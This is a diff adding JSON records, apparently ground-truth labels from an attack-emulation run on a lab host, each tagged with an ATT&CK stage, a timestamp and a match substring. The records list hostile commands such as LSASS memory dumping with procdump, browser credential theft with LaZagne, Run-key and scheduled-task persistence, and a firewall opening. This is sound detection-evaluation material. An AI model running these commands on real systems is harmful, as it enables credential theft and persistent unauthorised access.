+      "occurTime_end": "2022-04-08 14:06:04.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A5",
+      "stage": "Execution",
+      "match_substring": "localport=80",
+      "full_command": "netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:06:14.000",
+      "occurTime_end": "2022-04-08 14:06:14.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A6",
+      "stage": "Execution",
+      "match_substring": "wmic computersystem get domain",
+      "full_command": "wmic computersystem get domain",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:06:24.000",
+      "occurTime_end": "2022-04-08 14:06:24.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A7",
+      "stage": "Persistence",
+      "match_substring": "Policies\\Explorer\\Run",
+      "full_command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v test /t REG_SZ /d \"C:\\windows\\system32\\calc.exe\" /f",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:10:42.000",
+      "occurTime_end": "2022-04-08 14:10:42.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A8",
+      "stage": "Persistence",
+      "match_substring": "1053.005.bat",
+      "full_command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:10:52.000",
+      "occurTime_end": "2022-04-08 14:10:52.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A9",
+      "stage": "Privilege Escalation",
+      "match_substring": "T1134.001",
+      "full_command": "Invoke-AtomicTest T1134.001 -TestNumbers 1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:11:02.000",
+      "occurTime_end": "2022-04-08 14:11:08.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A10",
+      "stage": "Privilege Escalation",
+      "match_substring": "1053.005.bat",
+      "full_command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:11:13.000",
+      "occurTime_end": "2022-04-08 14:11:13.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A11",
+      "stage": "Defense Evasion",
+      "match_substring": "T1134.001",
+      "full_command": "Invoke-AtomicTest T1134.001 -TestNumbers 1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:11:23.000",
+      "occurTime_end": "2022-04-08 14:11:51.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A12",
+      "stage": "Defense Evasion",
+      "match_substring": "localport=80",
+      "full_command": "netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:11:33.000",
+      "occurTime_end": "2022-04-08 14:11:34.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A13",
+      "stage": "Defense Evasion",
+      "match_substring": "HookSSLX64.dll",
+      "full_command": "del /f HookSSLX64.dll",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\HookSSLX64.dll",
+      "occurTime_start": "2022-04-08 14:11:44.000",
+      "occurTime_end": "2022-04-08 14:11:44.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A14",
+      "stage": "Defense Evasion",
+      "match_substring": "spolsv.exe",
+      "full_command": "spolsv.exe",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\spolsv.exe",
+      "occurTime_start": "2022-04-08 14:11:54.000",
+      "occurTime_end": "2022-04-08 14:11:54.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A15",
+      "stage": "Defense Evasion",
+      "match_substring": "echo test >> test.exe",
+      "full_command": "echo test >> test.exe",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\test.exe",
+      "occurTime_start": "2022-04-08 14:12:04.000",
+      "occurTime_end": "2022-04-08 14:12:05.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A16",
+      "stage": "Credential Access",
+      "match_substring": "lazagne1.exe",
+      "full_command": "lazagne1.exe browsers",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\lazagne1.exe",
+      "occurTime_start": "2022-04-08 14:12:15.000",
+      "occurTime_end": "2022-04-08 14:12:17.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A17",
+      "stage": "Credential Access",
+      "match_substring": "procdump.exe",
+      "full_command": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\procdump.exe",
+      "occurTime_start": "2022-04-08 14:12:25.000",
+      "occurTime_end": "2022-04-08 14:12:25.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A18",
+      "stage": "Credential Access",
+      "match_substring": "T1003.003",
+      "full_command": "Invoke-AtomicTest T1003.003",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:12:35.000",
+      "occurTime_end": "2022-04-08 14:14:46.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A19",
+      "stage": "Discovery",
+      "match_substring": "domain admins",
+      "full_command": "net group \"domain admins\" /domain",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:14:58.000",
+      "occurTime_end": "2022-04-08 14:14:58.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A20",
+      "stage": "Discovery",
+      "match_substring": "netstat -an",
+      "full_command": "netstat -an",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:15:08.000",
+      "occurTime_end": "2022-04-08 14:15:08.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A21",
+      "stage": "Discovery",
+      "match_substring": "arp -a",
+      "full_command": "arp -a",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:15:18.000",
+      "occurTime_end": "2022-04-08 14:15:18.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A22",
+      "stage": "Collection",
+      "match_substring": "T1022.zip",
+      "full_command": "mkdir C:\\%HOMEPATH%\\Desktop\\T1022  & echo ipconfig /all > C:\\%HOMEPATH%\\Desktop\\T1022\\T1022.txt & 7z.exe a -tzip T1022.zip C:\\%HOMEPATH%\\Desktop\\T1022",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:15:29.000",
+      "occurTime_end": "2022-04-08 14:15:29.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A23",
+      "stage": "Collection",
+      "match_substring": "T1119",
+      "full_command": "Invoke-AtomicTest T1119",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:15:39.000",
+      "occurTime_end": "2022-04-08 14:15:44.000",
+      "hostIp": "192.168.0.74"
+    }
+  ]
+}
